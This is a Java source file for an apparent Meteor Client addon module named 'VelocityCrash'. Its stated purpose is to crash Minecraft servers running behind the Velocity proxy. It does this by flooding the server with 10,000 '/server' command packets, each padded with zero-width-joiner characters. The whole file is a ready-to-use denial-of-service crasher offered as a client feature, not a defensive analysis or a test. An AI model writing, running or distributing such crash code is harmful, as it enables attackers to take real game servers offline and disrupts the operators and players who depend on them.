package com.haykkonen.lanyard.modules.crashers.flood;

import com.haykkonen.lanyard.Lanyard;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.StringSetting;
import net.minecraft.network.listener.ServerPlayPacketListener;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

import java.util.function.Supplier;

public class VelocityCrash extends AbstractPacketFloodCrasher<ServerPlayPacketListener> {

    private final Setting<String> serverName = sgGeneral.add(new StringSetting.Builder()
        .name("server-name")
        .description("The world name to spam. Use 'lobby' for the default lobby server.")
        .defaultValue("lobby")
        .build()
    );

    private final Setting<Integer> buffer = sgGeneral.add(new IntSetting.Builder()
        .name("buffer")
        .description("The size of the spam buffer.")
        .defaultValue(200)
        .min(0)
        .max(256)
        .build()
    );

    public VelocityCrash() {
        super(Lanyard.CATEGORY_CRASH, "VelocityCrash", "Crashes the server by spamming a command to change the world.");
        this.amount.set(10000);
    }

    @Override
    protected Supplier<Packet<ServerPlayPacketListener>> createPacketSupplier() {
        String payload = "/server " + serverName.get() + " " + SPAM_CHAR_ZWJ.repeat(buffer.get());

        final Packet<ServerPlayPacketListener> packet = new CommandExecutionC2SPacket(payload);

        return () -> packet;
    }
}
